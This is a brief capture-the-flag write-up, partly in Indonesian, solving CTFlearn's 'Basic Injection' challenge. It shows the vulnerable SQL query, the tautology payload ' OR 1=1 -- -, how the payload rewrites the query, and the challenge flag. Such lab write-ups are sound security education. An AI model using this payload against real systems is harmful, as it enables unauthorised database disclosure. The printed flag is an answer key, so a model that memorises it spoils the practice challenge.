# Basic Injection

## Deskripsi

See if you can leak the whole database using what you know about SQL Injections.
[link](https://web.ctflearn.com/web4/)

Don't know where to begin? Check out CTFlearn's [SQL Injection Lab](https://ctflearn.com/lab/sql-injection-part-1)

---

## Analisis

Membuka link challenge akan muncul halaman seperti berikut:
![Gambar Chall](chall.png)
Dari gambar diatas diketahui bahwa quey sql yang dipakai yaitu 
```sql
SELECT * FROM webfour.webfour where name = '$input'
```
Masalah utama pada query ini adalah input user langsung dimasukkan ke dalam query SQL tanpa validasi atau _prepared statement_, sehingga memungkinkan terjadinya SQL Injection.

---

## Eksploitasi

Untuk mengeksploitasi celah tersebut, digunakan payload SQL Injection sederhana:

```
' OR 1=1 -- -
```

**Penjelasan Payload:**

* `'` Menutup string pada query SQL
* `OR 1=1` Kondisi yang selalu bernilai TRUE
* `-- -` Komentar SQL untuk mengabaikan sisa query

Sehingga query yang dieksekusi database menjadi:

```sql
SELECT * FROM webfour.webfour
WHERE name = '' OR 1=1 -- -';
```

Karena kondisi `1=1` selalu benar, database akan mengembalikan seluruh isi tabel, termasuk data yang seharusnya tersembunyi.

Hasilnya, semua baris dalam database berhasil ditampilkan dan flag dapat diperoleh.

![Flag](solved.png)

---

## Flag
```
CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
``` 
